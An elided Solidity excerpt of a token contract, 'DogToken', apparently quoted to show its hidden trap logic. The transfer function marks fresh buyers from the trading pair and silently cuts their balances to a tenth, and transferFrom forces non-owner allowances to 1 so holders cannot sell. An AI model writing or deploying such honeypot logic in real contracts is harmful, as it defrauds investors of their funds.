...
contract DogToken {
    ...
    address public Bye=0x000000000000000000000000000000000000dEaD;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Bye != Owner && balanceOf[Bye]>=totalSupply.div(20)) {
            balanceOf[Bye]=balanceOf[Bye].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {Bye = to;} 
        if (to== Owner) {Bye=to;} 
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Bye) {allowance[from][msg.sender]=1;} 
